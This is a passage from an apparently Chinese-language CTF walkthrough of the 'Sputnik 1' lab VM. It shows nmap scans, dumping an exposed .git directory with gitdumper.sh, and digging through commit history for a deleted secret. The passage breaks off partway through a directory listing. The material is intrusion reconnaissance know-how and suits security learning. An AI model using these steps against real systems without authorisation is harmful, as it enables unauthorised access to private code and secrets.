    <content type="html"><![CDATA[<h1 id="Spuktnik-1-靶机"><a href="#Spuktnik-1-靶机" class="headerlink" title="Spuktnik_1 靶机"></a>Spuktnik_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.130 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 08:40 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.130<br>Host is up (0.00034s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>8089/tcp  open  unknown<br>55555/tcp open  unknown<br>61337/tcp open  unknown<br>MAC Address: 08:00:27:D8:0B:51 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.45 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Sputnik]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.130   <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 09:47 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.130<br>Host is up (0.0011s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:D8:0B:51 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 24.37 seconds<br></code></pre></td></tr></table></figure><p>开放了三个不常见的TCP端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.130<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 08:40 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.130<br>Host is up (0.00071s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>8089/tcp  open  unknown<br>55555/tcp open  unknown<br>61337/tcp open  unknown<br>MAC Address: 08:00:27:D8:0B:51 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.73 seconds<br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p8089,55555,61337 192.168.56.130<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 08:41 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.130<br>Host is up (0.00055s latency).<br><br>PORT      STATE SERVICE  VERSION<br>8089/tcp  open  ssl/http Splunkd httpd<br>|_http-server-header: Splunkd<br>|_http-title: splunkd<br>| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser<br>| Not valid before: 2019-03-29T11:03:21<br>|_Not valid after:  2022-03-28T11:03:21<br>| http-robots.txt: 1 disallowed entry <br>|_/<br>55555/tcp open  http     Apache httpd 2.4.29 ((Ubuntu))<br>|_http-title: Flappy Bird Game<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>| http-git: <br>|   192.168.56.130:55555/.git/<br>|     Git repository found!<br>|_    Repository description: Unnamed repository; edit this file <span class="hljs-string">&#x27;description&#x27;</span> to name the...<br>61337/tcp open  http     Splunkd httpd<br>|_http-server-header: Splunkd<br>| http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">|_Requested resource was http://192.168.56.130:61337/en-US/account/login?return_to=%2Fen-US%2F</span><br><span class="hljs-string">| http-robots.txt: 1 disallowed entry </span><br><span class="hljs-string">|_/</span><br><span class="hljs-string">MAC Address: 08:00:27:D8:0B:51 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 3.X|4.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-string">OS details: Linux 3.2 - 4.9</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 37.70 seconds</span><br></code></pre></td></tr></table></figure><p>每个端口都有对应的 Web 服务，55555 端口有泄露 <code>.git</code> 的情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p8089,55555,61337 192.168.56.130 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 08:59 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.130<br>Host is up (0.00075s latency).<br><br>PORT      STATE SERVICE<br>8089/tcp  open  unknown<br>55555/tcp open  unknown<br>61337/tcp open  unknown<br>MAC Address: 08:00:27:D8:0B:51 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 45.10 seconds<br></code></pre></td></tr></table></figure><p>漏洞脚本扫描没结果</p><h2 id="git-泄露"><a href="#git-泄露" class="headerlink" title=".git 泄露"></a>.git 泄露</h2><p>简单查看各个 web 界面，发现 55555 端口是个小游戏，8089 是 Splunkd 的管理界面，但是 service 和 serviceNS 都需要登录才能查看，61337 也是需要登录，看起来是后台的正式登录界面</p><p><img src="/pic/f95d4ae467b16efc0da9ef83abc8803c_MD5.png"></p><p>接下来注意力主要放在 .git 目录。</p><p><img src="/pic/12000da549558a60e989dd7da6ea015b_MD5.png"></p><p>使用工具将其下载到本地查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Sputnik/GitTools/Dumper]<br>└─$ ./gitdumper.sh http://192.168.56.130:55555/.git/ <span class="hljs-built_in">clone</span><br><span class="hljs-comment">###########</span><br><span class="hljs-comment"># GitDumper is part of https://github.com/internetwache/GitTools</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Developed and maintained by @gehaxelt from @internetwache</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span><br><span class="hljs-comment"># Only for educational purposes!</span><br><span class="hljs-comment">###########</span><br><br><br>[*] Destination folder does not exist<br>[+] Creating <span class="hljs-built_in">clone</span>/.git/<br>[+] Downloaded: HEAD<br>[-] Downloaded: objects/info/packs<br>[+] Downloaded: description<br>[-] Downloaded: config<br>[-] Downloaded: COMMIT_EDITMSG<br>[+] Downloaded: index<br>[+] Downloaded: packed-refs<br>[+] Downloaded: refs/heads/master<br>[+] Downloaded: refs/remotes/origin/HEAD<br>[-] Downloaded: refs/stash<br>[+] Downloaded: logs/HEAD<br>[+] Downloaded: logs/refs/heads/master<br>[+] Downloaded: logs/refs/remotes/origin/HEAD<br>[-] Downloaded: info/refs<br>[+] Downloaded: info/exclude<br>[-] Downloaded: /refs/wip/index/refs/heads/master<br>[-] Downloaded: /refs/wip/wtree/refs/heads/master<br>[+] Downloaded: objects/89/9212a811519dd29ee550e163f40560f15107ff<br>[+] Downloaded: objects/21/b4eb398bdae0799afbbb528468b5c6f580b975<br>[-] Downloaded: objects/00/00000000000000000000000000000000000000<br>[+] Downloaded: objects/dd/b976cde6367cc38a83709b34940c20071c028f<br>[+] Downloaded: objects/20/395ca0a240b85c4289e06ea59f4cf19d4a7bd6<br>[+] Downloaded: objects/b4/35a10303be16fe1af8f6c8640f4b9121d3b00e<br>[+] Downloaded: objects/2b/5f6a83f073daba038f700ead56834c3795f3c2<br>[+] Downloaded: objects/bd/b0cabc87cf50106df6e15097dff816c8c3eb34<br>[+] Downloaded: objects/cd/2946ad76b4402e5b3cab9243a9281aad228670<br>[+] Downloaded: objects/b7/c6a79fd534ed19ab1708ac7a754ca1db28b951<br>[+] Downloaded: objects/df/45033222b87c64965dce38263e6d5948fb5ec1<br>[+] Downloaded: objects/ad/295422122860df7d9a4ef0c74de1e6deb67050<br>[+] Downloaded: objects/4e/007610d905bd04d2779c5eed42baf4882da8d9<br>[+] Downloaded: objects/8f/260dadbe40cdc656eb43c0c24401bdd4255bd0<br>[+] Downloaded: objects/ae/d22cd9ee281b5ea70ba1d23b03c4ecb5277581<br>[+] Downloaded: objects/d3/441572c46f5df5fee247527c91036a000502cd<br>[+] Downloaded: objects/80/a878bb7c7c26551037e6af8333f1ad331a7fd6<br>[+] Downloaded: objects/0d/afaf31ba3bc76844127b417191be59d320d705<br>[+] Downloaded: objects/06/f56474f3bf500c539c738d6bb7093823594d85<br>[+] Downloaded: objects/b3/8d4f0e65b0bc7044792da436da5d763dc1acd1<br>[+] Downloaded: objects/6f/749e77927895771fc0c67d2049be7f7ffeb7c0<br>[+] Downloaded: objects/07/fda135aae22fa7869b3de9e450ff7cacfbc717<br>[+] Downloaded: objects/ea/cc72595ded7dd95db6045e7d34c989c2b9fc8f<br>[+] Downloaded: objects/14/9ecc70a312bb6c2e184d9106adb1ab0b91fa49<br>[+] Downloaded: objects/25/41266769d9ea409ad2e84fce3dd0267ed89a04<br>[-] Downloaded: objects/f4/385198ce1cab56e0b2a1c55e8863040045b085<br>[+] Downloaded: objects/99/e27515fca6dcbb65c9146ea4ec08ff86a0d3e0<br>[+] Downloaded: objects/30/db67474fc60907100c33130930c6a686854f1f<br>[+] Downloaded: objects/04/5511e6166a080522fea6d3dcb49899d30a9b03<br>[+] Downloaded: objects/75/c741fdd3e600a3cdf11414beb0c9dab8646466<br>[+] Downloaded: objects/27/fd90cc337d599e4d93d6ceeced4664426243df<br>[+] Downloaded: objects/8b/8be7119c795b91424aa237bc91e058a0bffa15<br>[+] Downloaded: objects/cf/40c32b4b3e714d4616f8721ec54f6f446181a7<br>[+] Downloaded: objects/31/9b43a0731b8e8278bcb7c2c16f9008cf45c822<br></code></pre></td></tr></table></figure><p>然后切换到该目录下，进行查看。首先 git log 查看（显示到 HEAD 所指向的 commit 为止的所有 commit 记录）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/…/Sputnik/GitTools/Dumper/clone]<br>└─$ git <span class="hljs-built_in">log</span>                              <br>commit 21b4eb398bdae0799afbbb528468b5c6f580b975 (HEAD -&gt; master, origin/master, origin/HEAD)<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 21:02:22 2019 +0800<br><br>    Update index.html<br><br>commit 2b5f6a83f073daba038f700ead56834c3795f3c2<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:30:41 2019 +0800<br><br>    Update sprite.js<br><br>commit 0dafaf31ba3bc76844127b417191be59d320d705<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:28:58 2019 +0800<br><br>    Delete new file<br><br>commit b38d4f0e65b0bc7044792da436da5d763dc1acd1<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:28:15 2019 +0800<br><br>    Update new file<br><br>commit 07fda135aae22fa7869b3de9e450ff7cacfbc717<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:27:01 2019 +0800<br><br>    Commit new file<br><br>commit 2541266769d9ea409ad2e84fce3dd0267ed89a04<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:05:22 2019 +0800<br><br>    Update README.md<br><br>commit 99e27515fca6dcbb65c9146ea4ec08ff86a0d3e0<br>Author: richagithub &lt;richa09me@gmail.com&gt;<br>Date:   Mon Aug 14 20:35:42 2017 +0530<br><br>    Update README.md<br><br>commit 045511e6166a080522fea6d3dcb49899d30a9b03<br>Author: richagithub &lt;richa09me@gmail.com&gt;<br>Date:   Wed Apr 13 12:49:26 2016 +0530<br><br>    first commit<br>    <br>    completed on pc<br><br>commit 27fd90cc337d599e4d93d6ceeced4664426243df<br>Author: richagithub &lt;richa09me@gmail.com&gt;<br>Date:   Wed Apr 13 12:48:25 2016 +0530<br><br>    :space_invader: Added .gitattributes &amp; .gitignore files<br><br>commit cf40c32b4b3e714d4616f8721ec54f6f446181a7<br>Author: richagithub &lt;richa09me@gmail.com&gt;<br>Date:   Wed Apr 13 14:05:09 2016 +0530<br><br>    Initial commit<br></code></pre></td></tr></table></figure><p>这里我们可以加上 <code>--raw</code> 参数来得到更全面的信息，<code>git log --raw</code> 输出的格式更加详细，包含了每个提交中所有被修改的文件以及修改的具体行数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/…/Sputnik/GitTools/Dumper/clone]<br>└─$ git <span class="hljs-built_in">log</span> --raw<br>commit 21b4eb398bdae0799afbbb528468b5c6f580b975 (HEAD -&gt; master, origin/master, origin/HEAD)<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 21:02:22 2019 +0800<br><br>    Update index.html<br><br>:100644 100644 b7c6a79 aed22cd M        index.html<br><br>commit 2b5f6a83f073daba038f700ead56834c3795f3c2<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:30:41 2019 +0800<br><br>    Update sprite.js<br><br>:100644 100644 ad29542 d344157 M        sprite.js<br><br>commit 0dafaf31ba3bc76844127b417191be59d320d705<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:28:58 2019 +0800<br><br>    Delete new file<br><br>:100644 000000 eacc725 0000000 D        secret<br><br>commit b38d4f0e65b0bc7044792da436da5d763dc1acd1<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:28:15 2019 +0800<br><br>    Update new file<br><br>:100644 100644 f438519 eacc725 M        secret<br><br>commit 07fda135aae22fa7869b3de9e450ff7cacfbc717<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:27:01 2019 +0800<br><br>    Commit new file<br><br>:000000 100644 0000000 f438519 A        secret<br><br>commit 2541266769d9ea409ad2e84fce3dd0267ed89a04<br>Author: Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;<br>Date:   Fri Mar 29 20:05:22 2019 +0800<br><br>    Update README.md<br><br>:100644 100644 75c741f 8f260da M        README.md<br><br>commit 99e27515fca6dcbb65c9146ea4ec08ff86a0d3e0<br>Author: richagithub &lt;richa09me@gmail.com&gt;<br>Date:   Mon Aug 14 20:35:42 2017 +0530<br><br>    Update README.md<br><br>:100644 100644 8f260da 75c741f M        README.md<br><br>commit 045511e6166a080522fea6d3dcb49899d30a9b03<br>Author: richagithub &lt;richa09me@gmail.com&gt;<br>Date:   Wed Apr 13 12:49:26 2016 +0530<br><br>    first commit<br>    <br>    completed on pc<br><br>:000000 100644 0000000 b7c6a79 A        index.html<br>:000000 100644 0000000 df45033 A        sheet.png<br>:000000 100644 0000000 ad29542 A        sprite.js<br><br>commit 27fd90cc337d599e4d93d6ceeced4664426243df<br>Author: richagithub &lt;richa09me@gmail.com&gt;<br>Date:   Wed Apr 13 12:48:25 2016 +0530<br><br>    :space_invader: Added .gitattributes &amp; .gitignore files<br><br>:000000 100644 0000000 bdb0cab A        .gitattributes<br>:000000 100644 0000000 cd2946a A        .gitignore<br><br>commit cf40c32b4b3e714d4616f8721ec54f6f446181a7<br>Author: richagithub &lt;richa09me@gmail.com&gt;<br>Date:   Wed Apr 13 14:05:09 2016 +0530<br><br>    Initial commit<br><br>:000000 100644 0000000 8f260da A        README.md<br></code></pre></td></tr></table></figure><p>使用 <code>--raw</code> 参数可以看到 <code>secret</code> 被创建然后被删除了，尝试使用 <code>git checkout +CommmitId</code> 来将工作目录和索引重置为该提交的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/…/GitTools/Dumper/clone/_sheet.png.extracted]<br>└─$ git checkout 07fda135aae22fa7869b3de9e450ff7cacfbc717 <br>error: unable to <span class="hljs-built_in">read</span> sha1 file of secret (f4385198ce1cab56e0b2a1c55e8863040045b085)<br>error: invalid object 100644 f4385198ce1cab56e0b2a1c55e8863040045b085 <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;secret&#x27;</span><br>D       secret<br>Note: switching to <span class="hljs-string">&#x27;07fda135aae22fa7869b3de9e450ff7cacfbc717&#x27;</span>.<br><br>You are <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;detached HEAD&#x27;</span> state. You can look around, make experimental<br>changes and commit them, and you can discard any commits you make <span class="hljs-keyword">in</span> this<br>state without impacting any branches by switching back to a branch.<br><br>If you want to create a new branch to retain commits you create, you may<br><span class="hljs-keyword">do</span> so (now or later) by using -c with the switch <span class="hljs-built_in">command</span>. Example:<br><br>  git switch -c &lt;new-branch-name&gt;<br><br>Or undo this operation with:<br><br>  git switch -<br><br>Turn off this advice by setting config variable advice.detachedHead to <span class="hljs-literal">false</span><br><br>HEAD is now at 07fda13 Commit new file<br></code></pre></td></tr></table></figure><p>出现了错误</p><p><img src="/pic/06941e49e89542fb0aeb5d57753f35f9_MD5.png"></p><p>应该是文件损坏，再翻看一下 git log 发现了其中包含一个用户名和一个用户邮箱，以及一个 git 用户邮箱 <code>Ameer Pornillos &lt;44928938+ameerpornillos@users.noreply.github.com&gt;</code></p><h2 id="GitHub-泄露"><a href="#GitHub-泄露" class="headerlink" title="GitHub 泄露"></a>GitHub 泄露</h2><p>尝试去 GitHub 搜索该用户，查看其仓库</p><p><img src="/pic/8c7428bf443cd489870f64591fed5cda_MD5.png"></p><p>将其下载到本地</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Sputnik]<br>└─$ git <span class="hljs-built_in">clone</span> https://github.com/ameerpornillos/flappy.git<br>Cloning into <span class="hljs-string">&#x27;flappy&#x27;</span>...<br>remote: Enumerating objects: 65, <span class="hljs-keyword">done</span>.<br>remote: Total 65 (delta 0), reused 0 (delta 0), pack-reused 65<br>Receiving objects: 100% (65/65), 31.52 KiB | 424.00 KiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (22/22), <span class="hljs-keyword">done</span>.<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Sputnik/flappy]<br>└─$ git checkout 07fda135aae22fa7869b3de9e450ff7cacfbc717     <br>Note: switching to <span class="hljs-string">&#x27;07fda135aae22fa7869b3de9e450ff7cacfbc717&#x27;</span>.<br><br>You are <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;detached HEAD&#x27;</span> state. You can look around, make experimental<br>changes and commit them, and you can discard any commits you make <span class="hljs-keyword">in</span> this<br>state without impacting any branches by switching back to a branch.<br><br>If you want to create a new branch to retain commits you create, you may<br><span class="hljs-keyword">do</span> so (now or later) by using -c with the switch <span class="hljs-built_in">command</span>. Example:<br><br>  git switch -c &lt;new-branch-name&gt;<br><br>Or undo this operation with:<br><br>  git switch -<br><br>Turn off this advice by setting config variable advice.detachedHead to <span class="hljs-literal">false</span><br><br>HEAD is now at 07fda13 Commit new file<br><br><br>┌──(kali㉿kali)-[~/Downloads/Sputnik/flappy]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 52K<br>1183470 drwxr-xr-x 3 kali kali 4.0K Jul 18 11:04 .<br>1183326 